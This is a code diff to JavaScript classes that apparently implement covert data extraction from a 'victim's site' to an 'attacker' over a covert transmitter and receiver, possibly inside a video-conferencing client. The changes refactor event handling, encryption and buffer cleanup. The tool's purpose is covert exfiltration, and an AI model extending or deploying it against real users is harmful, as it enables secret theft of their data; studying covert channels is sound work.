@@ -72,7 +72,7 @@ export class CommunicationHandler {
     }
 
     /**
-     * 
+     *
      */
     dispatchExtractionEvent(data) {
         this.extractionEvent.dispatchEvent(new CustomEvent('extractionEnded', {
@@ -96,17 +96,22 @@ export class CommunicationHandler {
             // Event for downloading extracted data at the end of extraction.
             // Define custom event 'extractionEnded' and trigger it.
 
-            if (this.enabledEncryption()) {
+            if (this.enabledEncryption() && this._fileBuffer.length) {
                 console.log('DECRYPT:', recievedData.payload, this);
                 DataEncoder.decrypt(this.fullData, this.key, this.iv).then(decryptedData => {
+                    APP.conference.DataEncoder = DataEncoder;
                     this.dispatchExtractionEvent(decryptedData);
+                    this._fileBuffer = []; // empty the file buffer after ending communication.
+                    this.communicationEnded = true;
+                })
+                .catch(e => {
+                    console.error(e);
                 });
             } else {
                 this.dispatchExtractionEvent(this.fullData);
+                this._fileBuffer = []; // empty the file buffer after ending communication.
+                this.communicationEnded = true;
             }
-
-            this._fileBuffer = []; // empty the file buffer after ending communication.
-            this.communicationEnded = true;
 
         } else { // 'reply' containg text data
             this._fileBuffer.push(recievedData.payload);
@@ -127,6 +132,11 @@ export default class ExtractionHandler extends CommunicationHandler {
     constructor(configuration) {
         super(configuration);
         this.nameOfCommunication = this.getCommunicationName();
+        this.onExtractionEnded = () => {
+            // buy default only end the communication with the reply
+            // This function is called on both sides when the extraction communication ends
+            this.endCommunication(this.user);
+        };
     }
 
     /**
@@ -146,12 +156,18 @@ export default class ExtractionHandler extends CommunicationHandler {
     }
 
     /**
+     *
+     */
+    onCommunicationEnded(object) {
+        this.onExtractionEnded(object);
+        this.extractionEvent.removeEventListener('extractionEnded', this.onCommunicationEnded.bind(this));
+    }
+
+    /**
      * This is only for the victim's site
      */
-    createExtractionEndedListener(attacker) {
-        this.extractionEvent.addEventListener('extractionEnded', () => {
-            this.endCommunication(attacker);
-        });
+    createExtractionEndedListener() {
+        this.extractionEvent.addEventListener('extractionEnded', this.onCommunicationEnded.bind(this));
     }
 
     /**
@@ -160,7 +176,8 @@ export default class ExtractionHandler extends CommunicationHandler {
      */
     async sendAll(data, attacker) {
         // If the method can loose data through the transition send the final size of sent file.
-        this.createExtractionEndedListener(attacker);
+        this.user = attacker;
+        this.createExtractionEndedListener();
         if (this.enabledEncryption()) {
             DataEncoder.encrypt(data, this.configuration.key, this.configuration.iv).then(encryptedData => {
                 const initiator = new CovertTransmitter(attacker, this.configuration,
@@ -181,10 +198,7 @@ export default class ExtractionHandler extends CommunicationHandler {
      */
     receiveAll(user) {
         // TODO: add generic code for all types of communication.
-        const mandatory = [ this.configuration, this.nameOfCommunication, this.extractionEvent ];
-
-        console.log('receive mandatory:', ...mandatory);
-
+        this.user = user;
         const initiator = new CovertReceiver(user, this.configuration,
                 this.nameOfCommunication, this.extractionProcess, this._fileBuffer);
 
